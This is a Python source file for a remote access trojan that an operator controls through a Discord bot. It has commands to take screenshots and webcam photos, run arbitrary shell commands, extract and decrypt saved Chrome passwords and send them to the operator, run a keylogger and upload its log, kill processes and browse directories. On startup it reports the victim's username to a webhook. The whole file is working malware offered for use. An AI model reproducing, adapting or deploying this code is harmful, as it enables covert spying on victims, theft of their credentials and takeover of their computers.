import getpass
import requests
import winreg
import ctypes
import sys
from cv2 import *
import pynput
import subprocess as sp
from pynput.keyboard import Key, Listener
import logging
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome import Random
from Cryptodome.Cipher import AES
import shutil
import ssl
import random
import threading
import time
import PIL
from PIL import ImageGrab
import requests
import subprocess
import pyautogui
import discord
from cv2 import VideoCapture, imwrite, waitKey, destroyWindow
from discord.ext import commands
from discord import utils

bot = commands.Bot(command_prefix='>')
bot.remove_command("help")

webhook = ""
token = ""

@bot.event
async def on_ready():

    requests.post(webhook, data={'content': 'CONNECTED | USER: ' + getpass.getuser()})


@bot.command(pass_context=True)
async def screenshot(ctx):

    myscreen = ImageGrab.grab()
    myscreen.save(f'screenshot.png')

    file = discord.File('screenshot.png')

    await ctx.send(file=file)


@bot.command()
async def camera(ctx):
    cam_port = 0
    cam = VideoCapture(cam_port)

    result, image = cam.read()

    if result:

        imwrite("camera.png", image)

        file = discord.File('camera.png')

        await ctx.send(file=file)

    # If captured image is corrupted, moving to else part
    else:

        embed = discord.Embed(title='FAILED', description='NO CAMERA DETECTED')
        await ctx.send(embed=embed)


@bot.command()
async def execute(ctx, *, message):
    os.system(message)

    embed = discord.Embed(title=f'SUCCESSFULY EXECUTED', description='executed: ' + message)

    await ctx.send(embed=embed)


@bot.command()
async def password(ctx):
    global temp

    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                temp = (os.getenv('TEMP'))
                output = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                f4 = open(temp + r"\passwords.txt", 'a')
                f4.write(str(output))
                f4.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
        file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
        await ctx.send("[*] Command successfuly executed", file=file)
        os.system("del %temp%\passwords.txt /f")
    except Exception as e:
        pass


@bot.command()
async def startkeylogger(ctx):
    temp = os.getenv("TEMP")
    log_dir = temp
    logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def keylog():
        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

    global test

    test = threading.Thread(target=keylog)
    test._running = True
    test.daemon = True
    test.start()
    embed = discord.Embed(title='SUCCESSFUL', description='successfully started keylogger')
    await ctx.send(embed=embed)


@bot.command()
async def stopkeylogger(ctx):
    test._running = False
    embed = discord.Embed(title='SUCCESSFUL', description='successfully stopped keylogger')
    await ctx.send(embed=embed)


@bot.command()
async def dumpkeylogger(ctx):
    temp = os.getenv("TEMP")
    file_keys = temp + r"\key_log.txt"
    file = discord.File(file_keys, filename="key_log.txt")
    await ctx.send("SUCCESSFUL", file=file)
    os.popen(f"del {file_keys}")


@bot.command()
async def prockill(ctx, *, message):
    kilproc = r"taskkill /IM" + ' "' + message + '" ' + r"/f"
    os.system(kilproc)
    time.sleep(2)
    process_name = message
    call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
    output = subprocess.check_output(call).decode()
    last_line = output.strip().split('\r\n')[-1]
    done = (last_line.lower().startswith(process_name.lower()))
    if done == False:
        embed = discord.Embed(title="SUCCESSFUL", description="killed: " + message)
        await ctx.send(embed=embed)
    elif done == True:
        embed = discord.Embed(title="FAILED", description="failed to kill: " + message)
        await ctx.send(embed=embed)


@bot.command()
async def displaydir(ctx):
    def shell():
        output = subprocess.run("dir", stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        global status
        status = "ok"
        return output

    import threading
    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    time.sleep(1)
    shel._running = False
    if status:
        result = str(shell().stdout.decode('CP437'))
        numb = len(result)
        if numb < 1:
            await ctx.send("NO OUTPUT OBTAINED")
        elif numb > 1990:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output22.txt"):
                os.system(r"del %temp%\output22.txt /f")
            f1 = open(temp + r"\output22.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output22.txt", filename="output22.txt")
            embed = discord.Embed(title='SUCCESS', description='command executed successfuly')
            await ctx.send(embed=embed, file=file)
        else:
            embed = discord.Embed(title='SUCCESS', description='command executed successfuly')
            embed.add_field(name="results", value=result)
            await ctx.channel.send(embed=embed)


@bot.command()
async def currentdir(ctx):
    output = sp.getoutput('cd')
    embed = discord.Embed(title='SUCCESS', description='command executed successfuly')
    embed.add_field(name="results", value=output)
    await ctx.send(embed=embed)


@bot.command()
async def cd(ctx, *, message):
    os.chdir(message)
    embed = discord.Embed(title='SUCCESS', description='command executed successfuly')
    embed.add_field(name="results", value=sp.getoutput('cd'))
    await ctx.send(embed=embed)

print("working")
bot.run(token)
